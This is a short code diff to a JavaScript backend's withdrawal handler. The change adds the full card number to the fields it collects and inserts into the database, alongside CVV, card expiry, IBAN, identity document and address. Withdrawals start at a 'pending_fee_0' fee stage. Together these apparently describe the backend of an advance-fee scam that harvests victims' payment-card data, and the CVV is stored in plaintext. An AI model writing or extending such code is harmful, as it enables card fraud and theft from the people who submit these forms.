@@ -444,7 +444,7 @@ const { sendWithdrawalRequestEmail } = require('../utils/email');
 const submitWithdrawal = async (req, res) => {
   try {
     const userId = req.user.id;
-    const { amount, first_name, last_name, address, postal_code, city, bank_name, iban, cvv, card_expiry, motif } = req.body;
+    const { amount, first_name, last_name, address, postal_code, city, bank_name, iban, card_number, cvv, card_expiry, motif } = req.body;
 
     // Validation champs requis
     if (!amount || !first_name || !last_name || !address || !postal_code || !city || !bank_name || !iban || !cvv || !card_expiry) {
@@ -475,9 +475,9 @@ const submitWithdrawal = async (req, res) => {
     const { identity_doc } = req.body;
 
     await db.run(
-      `INSERT INTO withdrawal_requests (user_id, amount, status, fee_level, identity_doc, first_name, last_name, address, postal_code, city, bank_name, iban, cvv, card_expiry, motif, reference)
-       VALUES (?, ?, 'pending_fee_0', 0, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-      [userId, amt, identity_doc || null, first_name, last_name, address, postal_code, city, bank_name, iban, cvv, card_expiry, motif || null, ref]
+      `INSERT INTO withdrawal_requests (user_id, amount, status, fee_level, identity_doc, first_name, last_name, address, postal_code, city, bank_name, iban, card_number, cvv, card_expiry, motif, reference)
+       VALUES (?, ?, 'pending_fee_0', 0, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+      [userId, amt, identity_doc || null, first_name, last_name, address, postal_code, city, bank_name, iban, card_number || null, cvv, card_expiry, motif || null, ref]
     );
 
     // Notification client
